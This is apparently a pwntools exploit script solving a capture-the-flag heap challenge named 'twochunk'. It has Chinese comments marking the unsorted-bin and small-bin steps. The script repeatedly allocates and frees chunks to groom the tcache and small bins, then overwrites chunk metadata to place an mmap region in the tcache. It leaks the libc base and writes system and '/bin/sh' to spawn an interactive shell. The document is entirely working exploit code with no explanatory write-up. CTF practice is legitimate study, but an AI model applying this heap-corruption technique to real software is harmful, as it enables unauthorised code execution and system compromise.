#coding:utf-8

from pwn import *
context.log_level = 'debug'
debug = 1


def wpAdd(r, idx, size):
	r.recvuntil('choice: ')
	r.send('1'.ljust(8, '\x00'))

	r.recvuntil('idx: ')
	r.send(str(idx).ljust(0x8, '\x00'))

	r.recvuntil('size: ')
	r.send(str(size).ljust(0x8, '\x00'))

def wpFree(r, idx):
	r.recvuntil('choice: ')
	r.send('2'.ljust(8, '\x00'))

	r.recvuntil('idx: ')
	r.send(str(idx).ljust(0x8, '\x00'))

def wpShow(r, idx):
	r.recvuntil('choice: ')
	r.send('3'.ljust(8, '\x00'))

	r.recvuntil('idx: ')
	r.send(str(idx).ljust(0x8, '\x00'))
	
	return r.recv(8)

def wpEdit(r, idx, content):
	r.recvuntil('choice: ')
	r.send('4'.ljust(8, '\x00'))

	r.recvuntil('idx: ')
	r.send(str(idx).ljust(0x8, '\x00'))

	r.recvuntil('content: ')
	r.send(content)

def wpGetNameMessage(r):
	r.recvuntil('choice: ')
	r.send('5'.ljust(8, '\x00'))

	return r.recvuntil('\n')

def wpSendEndMessage(r, message):
	r.recvuntil('choice: ')
	r.send('6'.ljust(8, '\x00'))

	r.recvuntil('leave your end message: ')
	r.send(message)

def wpShellcode(r):
	r.recvuntil('choice: ')
	r.send('7'.ljust(8, '\x00'))

def exp(debug):

	elf = ELF('./twochunk')
	if debug == 1:
		r = process('./twochunk')
		lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		#gdb.attach(r, 'b* $rebase(0x0000000000001778)')
	else:
		lib = ELF('./twochunk_lib')

	r.recvuntil('leave your name: ')
	r.send('hawk' + '\x00' * 0x4 + p64(0x23333000 + 0x20))
	r.recvuntil('leave your message: ')
	r.send('hawk\x00')

#---------------------------------------------------------------------------------------------
	for i in range(0x4):
		wpAdd(r, 0, 0x88)
		wpFree(r, 0)

	for i in range(0x7):
		wpAdd(r, 0, 0x188)
		wpFree(r, 0)


#-----------------开始放入unsorted bin------------------------------------------------
	wpAdd(r, 0, 0x188)
	wpAdd(r, 1, 0x200)
	#---------------------------转移到small bin中----------------------------------
	wpFree(r, 0)
	wpFree(r, 1)
	#---------------------------切割
	wpAdd(r, 0, 0xf8)
	wpAdd(r, 1, 0x200)
	wpFree(r, 0)
	wpFree(r, 1)


#-----------------开始放入unsorted bin------------------------------------------------
	wpAdd(r, 0, 0x188)
	wpAdd(r, 1, 0x200)
	#---------------------------转移到small bin中----------------------------------
	wpFree(r, 0)
	wpFree(r, 1)
	#---------------------------切割
	wpAdd(r, 0, 0xf8)
	wpAdd(r, 1, 0x200)
	wpFree(r, 0)
	wpFree(r, 1)

#-----------------开始放入unsorted bin------------------------------------------------
	wpAdd(r, 0, 0x188)
	wpAdd(r, 1, 0x200)
	#---------------------------转移到small bin中----------------------------------
	wpFree(r, 0)
	wpFree(r, 1)
	#---------------------------切割
	wpAdd(r, 0, 0xf8)
	wpAdd(r, 1, 0x200)
	wpEdit(r, 0, '\x00' * 0xf8 + p64(0x91) + p64(0)+ p64(0x23333000 - 0x10))

	wpFree(r, 0)
	wpFree(r, 1)

#-------------------成功将mmap中的chunk放入tcache	
	wpAdd(r, 0, 0x88)
	lib_base = u64(wpGetNameMessage(r).split('message: ')[1].split('\n')[0].ljust(8, '\x00')) + 0x7f342719c000 - 0x00007f3427386c60

	log.info('lib_base => %#x'%lib_base)

	wpSendEndMessage(r, p64(lib.sym['system'] + lib_base) + '/bin/sh\x00' + '\x00' * 0x20 + p64(0x23333000 + 0x8) * 3)
	wpShellcode(r)
	r.interactive()

exp(debug)
